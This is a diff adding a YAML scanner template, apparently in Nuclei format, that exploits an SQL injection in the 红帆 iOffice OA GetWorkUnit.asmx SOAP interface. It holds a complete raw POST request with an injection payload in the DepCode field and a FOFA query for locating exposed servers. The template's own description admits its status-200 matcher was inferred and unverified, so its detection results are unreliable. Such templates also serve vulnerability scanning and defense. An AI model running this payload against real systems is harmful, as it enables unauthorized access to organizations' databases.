@@ -1,0 +1,54 @@
+id: poc-szy9ucqpmksw4gqx
+info:
+  name: 红帆OA-GetWorkUnit.asmx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/szy9ucqpmksw4gqx
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: szy9ucqpmksw4gqx
+    fofa: app="红帆-ioffice"
+http:
+- raw:
+  - 'POST /ioffice/prg/interface/GetWorkUnit.asmx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Type: text/xml; charset=utf-8
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+
+    <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="
+
+    [http://www.w3.org/2001/XMLSchema-instance"](http://www.w3.org/2001/XMLSchema-instance%22) xmlns:xsd="http://www.w3.org/2001
+
+    /XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <GetDutyDetail xmlns="http://tempuri.org/">
+
+    <DepCode>1'' and @@version>0;--</DepCode>
+
+    <DutyDate>string</DutyDate>
+
+    <DutyName>string</DutyName>
+
+    </GetDutyDetail>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
